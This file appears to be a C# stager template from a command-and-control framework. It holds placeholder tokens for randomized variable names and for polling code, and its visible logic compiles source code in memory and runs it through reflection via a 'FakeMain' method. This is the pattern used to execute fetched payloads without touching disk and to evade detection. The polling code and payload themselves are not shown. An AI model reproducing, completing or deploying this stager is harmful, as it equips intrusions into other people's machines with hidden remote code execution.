using System;
using System.IO;
using System.Net;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Text;
using System.Reflection;
using System.Runtime.InteropServices;
using System.CodeDom.Compiler;
using System.Globalization;
using Microsoft.CSharp;
$IMPORTS$

namespace C2
{
    class Stager 
    {
		static void Main() 
        {
$POLLCODE$
			
			CSharpCodeProvider $variable_1$ = new CSharpCodeProvider();
			CompilerParameters $variable_parameters$ = new CompilerParameters();
$ASSEMBLIES$
			// True - memory generation, false - external file generation
			$variable_parameters$.GenerateInMemory = true;
			// True - exe file generation, false - dll file generation
			$variable_parameters$.GenerateExecutable = true;
			CompilerResults $variable_2$ = $variable_1$.CompileAssemblyFromSource($variable_parameters$, $variable_source$);
		
			if ($variable_2$.Errors.HasErrors)
			{
				return;
			}
			
			
			Assembly $variable_3$ = $variable_2$.CompiledAssembly;
			Type $variable_4$ = $variable_3$.GetType("Example.HelloWorld");
			
			//string[] p = new string[0];
			MethodInfo $variable_5$ = $variable_4$.GetMethod("FakeMain");
			//Console.WriteLine(p.Length);
			$variable_5$.Invoke(null, null);
		
	}

$POLLCODE_FUNCTION$
	
    }
}